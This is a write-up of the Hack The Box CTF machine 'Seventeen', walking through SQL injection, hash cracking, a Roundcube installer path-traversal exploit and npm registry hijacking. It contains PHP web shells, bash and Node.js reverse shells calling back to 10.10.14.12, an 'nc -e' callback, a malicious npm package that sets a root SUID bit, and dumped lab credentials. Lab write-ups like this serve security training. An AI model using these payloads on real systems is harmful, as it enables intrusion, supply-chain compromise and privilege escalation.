![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/seventeen%20logo.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/Seventeen.png)


## nmap all ports
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/nmap%20all%20ports.png)
## nmap services + versions
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/nmap%20services%20%2B%20versions.png)

## domain TCP 80 static--> new host: seventeen.htb
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/domain%20tcp%2080.png)

## wfuzz subdomains
````bash
wfuzz -u http://10.10.11.165 -H "Host:FUZZ.seventeen.htb" -w /opt/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 20689

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/wfuzz%20subdomains.png)

## domain: exam.seventeen.htb --> php
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/domain%20exam.seventeen.htb.png)

## searchsploit
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/searchsploit.png)
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/searchsploit%20poc.png)

### sqli id parameter
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqli%20id%20parameter.png)

## sqlmap
### dump databases
````bash
sqlmap -r req.txt --dbs --batch --threads 10

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqlmap%20dump%20databases.png)

### dump tables of given databases
````bash
sqlmap -r req.txt --dbs --batch --threads 10 -D db_sfms,erms_db --tables

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqlmap%20database%20tables.png)

### sqlmap dump tables
````bash
sqlmap -r req.txt --dbs --batch --threads 10 -D db_sfms -T user,storage,student --dump


sqlmap -r req.txt --dbs --batch --threads 10 -D erms_db -T users --dump
`````


````
/home/xenotim/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/user.csv


/home/xenotim/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/storage.csv

/home/xenotim/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/student.csv

/home/xenotim/.local/share/sqlmap/output/exam.seventeen.htb/dump/erms_db/users.csv
`````

### usernames and password hashes from sqlmap
````
admin:fc8ec7b43523e186a27f46957818391c
UndetectableMark:b35e311c80075c4916935cbbbd770cef
Stev1992:112dd9d08abf9dcceec8bc6d3e26b138
12345:1a40620f9a4ed6cb8d81a1d365559233
23347:abb635c915b0cc296e071e8d76e9060c
31234:a2afa567b1efdb42d8966353337d9024
43347:a1428092eb55781de5eb4fd5e2ceb835
Smith:1a40620f9a4ed6cb8d81a1d365559233
Mille:abb635c915b0cc296e071e8d76e9060c
Shane:a2afa567b1efdb42d8966353337d9024
Hales:a1428092eb55781de5eb4fd5e2ceb835

`````

### new possible domain: oldmangement.seventeen.htb
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sqlmap%20new%20possible%20subdomain.png)

## hashcat
````bash
./hashcat.bin ~/Desktop/HackTheBox/Seventeen/userhashes.txt /opt/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 0


//result
31234:a2afa567b1efdb42d8966353337d9024:autodestruction

`````

### login oldmanagement.seventeen.htb
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/oldmanagement%20login.png)


### login with creds found by sqlmap and cracked with hashcat
### login dashboard
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/login%20dashboard.png)

### burp intercept file upload
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/burp%20intercept%20file%20upload.png)

### looking up the save_file.php file 
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/save_file.php.png)
````php
<?php

require_once 'admin/conn.php';

if(ISSET($_POST['save'])){

$stud_no = $_POST['stud_no'];

$file_name = $_FILES['file']['name'];

$file_type = $_FILES['file']['type'];

$file_temp = $_FILES['file']['tmp_name'];

$location = "files/".$stud_no."/".$file_name;

$date = date("Y-m-d, h:i A", strtotime("+8 HOURS"));

if(!file_exists("files/".$stud_no)){

mkdir("files/".$stud_no);

}

if(move_uploaded_file($file_temp, $location)){

mysqli_query($conn, "INSERT INTO `storage` VALUES('', '$file_name', '$file_type', '$date', '$stud_no')") or die(mysqli_error());

header('location: student_profile.php');

}

}

?>

`````

### --> files are saved to: /files/stud_no/filename

### accessing file is forbidden
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/file%20access%20forbidden.png)

### downloading Marksheet-finals.pdf
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/sfms%20upload%20file.png)

### --> new hostname: mastermailer.seventeen.htb
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/Marksheet-finals.pdf%20extract.png)


### mastermailer login
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermailer%20login.png)

### source code view --> roundcube
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermailer%20source%20code%20reveals%20roundcube.png)

### roundcube files to access to find out version/release of roundcube
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20files%20to%20test.png)

### CHANGELOG request --> roundcube release:1.4.2
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermail%20changelog%20roundcube.png)

### google roundcub 1.4.2 --> release date
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/google%20roundcube%20release.png)

### 2 critical CVEs
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20CVEs.png)

### references for cve-2020-12640 --> DrunkenShells --> POC
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20cve%20links.png)

### POC cve-2020-12640
- the installer must be present
- a possibility to create a folder (already present: papers) and write a file to it (papers.php)

### roundcube installer step=1 is present
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20installer.png)

### wfuzz --> new folder papers 
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/wfuzz%20oldmanagement.png)

## uplaod papers.php
### uploaded papers.php
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/upload%20papers.php.png)
### papers.php
````bash
<?php 
sytem($_REQUEST['shell']);
?>

<?php
system('bash -c "bash -i >& /dev/tcp/10.10.14.12/9999 0>&1"');
?>

<?php
echo hello
system($_GET['cmd']);
?>

`````

### update installer config file
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20mastermailer%20step2.png)

### burp intercept UPDATE CONFIG
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20burp%20intercept%20update%20config.png)

### modifiy post data
```bash

//unmodified
_step=2&_product_name=Roundcube+Webmail&***TRUNCATED***&_plugins_qwerty=../../../../../../dev/shm/zipdownload&submit=UPDATE+CONFIG

//modified
_step=2&_product_name=Roundcube+Webmail&***TRUNCATED***&_plugins_qwerty=../../../../../../../../var/www/oldmanagement/files/31234/papers&submit=UPDATE+CONFIG

//or
_step=2&_product_name=Roundcube+Webmail&***TRUNCATED***&_plugins_qwerty=../../../../../../../../var/www/html/oldmanagement/files/31234/papers&submit=UPDATE+CONFIG

`````

### successfully saved new config file
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/roundcube%20mastermailer%20save%20config.png)



### accessing any page of roundcube --> shell
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/shell%20as%20www-data.png)

### 3 webservers are present
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/webservers.png)

### new creds in: oldmanagement/db/db_sfms.sql
````
admin:21232f297a57a5a743894a0e4a801fc3 
claire:827ccb0eea8a706c4c34a16891f84e7b

`````

### new creds in: employeemanagementsystem/process/dbh.php
````
root:2020bestyearofmylife

`````
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mark.php%20shows%20require.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/dbh.php%20new%20creds.png)

### new creds in: mastermailer/config.inc.php
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/config.inc.php%20new%20creds.png)

````
mysqluser:mysqlpassword

`````

### all creds found on the 3 webservers
````
admin:21232f297a57a5a743894a0e4a801fc3 
claire:827ccb0eea8a706c4c34a16891f84e7b

root:2020bestyearofmylife
mysqluser:mysqlpassword

`````

### user mark on system --> try ssh as mark with found creds
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mastermailer%20users.png)

### ssh as mark successfull
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20mark.png)

### user.txt
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/user.txt.png)

### kavi --> no access to it --> find files owned by kavi
````
find / -user kavi -ls 2>/dev/null

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/var%20mail%20kavi%20read%20permission.png)

### kavi mail --> old logger replaced by loglevel
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/kavi%20mail.png)

### list listening ports on box
````
ss -lntp

`````

### listening ports
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/listening%20ports.png)
Port 8000 is not present --> it behalves as a loadbalancer to the 6000er ports via ip tables --> HTB

### tilde escape sequence in ssh shell
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20escape%20sequences%20list.png)

### port forwarding localhost to: localhost:4873
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/port%20forward%20localhost%20ssh%20shell.png)

### localhost:4873 -->npm registry
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/localhost%204873.png)

### getting all the packages installed on that registry
````
npm search --registry http://localhost:4873

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20search%20installed%20packages%20on%20registry.png)

### kavi mail 
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/kavi%20mail%201.png)
- db-logger --> old version
- loglevel --> new one


### install old version: db-logger
````
npm install db-logger --registry http://localhost:4873

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20install%20db-logger.png)

### logger.js --> new creds
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/mysql%20login%20denied.png)

### mysql creds 
````
root:IhateMathematics123#

`````

### mysql login with found creds not successfull
````bash
mysql -u root -p -D logger

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20kavi%20successfull.png)

### kavi has replaced old software db-logger by loglevel --> password found in db-logger --> maybe valid for ssh session as kavi
### ssh as kavi successfull
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/ssh%20kavi%20successfull%201.png)

### manipulating .npmrc file so that it is pointing at the attacker machine
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npmrc%20manipulate%20registry.png)

### nc port 4873 --> call back
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20registry%20call%20back%20at%20me.png)

### docker
````bash
//install
sudo apt install docker.io

//pull the latest image
sudo docker pull verdaccio/verdaccio

//run docker locally and bind to port 4873
sudo docker run -it --rm -p 4873:4873 verdaccio/verdaccio

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/run%20docker%20locally.png)


### docker npm add user --> new authToken in .npmrc file
````
npm adduser --registry http://10.10.14.12:4873

`````

### now authentication to registry is possible with authToken
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npmrc%20authToken.png)

### npm init --> version must be greater than installed version
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20version%20loglevel.png)

### npm init --> setup new npm package
````bash
npm init

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20init.png)

### create malicious index.js file
````js

//not working
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.12", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

//not working
require('child_process').exec('nc -e /bin/bash 10.10.14.2 4444')

//not working really two; callback but no interaction
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.12/9999 0>&1'")


//working
require('child_process').exec("chown root:root /tmp/shell;chmod 4755 /tmp/shell")



`````

### node.js rev shell not working
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20shell%20not%20working.png)

### npm publish package
````
npm puplish --registry http://10.10.14.12:4873

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20publish%20package.png)

### npm package.json edit version
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/npm%20package.json.png)

### callback but no interaction in shell possible
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/almost%20reverse%20shell.png)

### ssh kavi: copy /bin/bash --> /tmp/shell
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/create%20copy%20of%20bin%20bash.png)

### tmp/shell permissins before and after --> tmp/shell is now a SUID binary owned by root
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/make%20tmp%20shell%20a%20SUID%20file.png)

### getting root shell by abusing SUID file
````
//elevating privilege by abusing a SUID file

/path/to/suid/file

./shell -p

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/abusing%20SUID%20file.png)

### root shell
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/shell%20root.png)

### root.txt
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Seventeen/screenshots/root.txt.png)

XXXXXx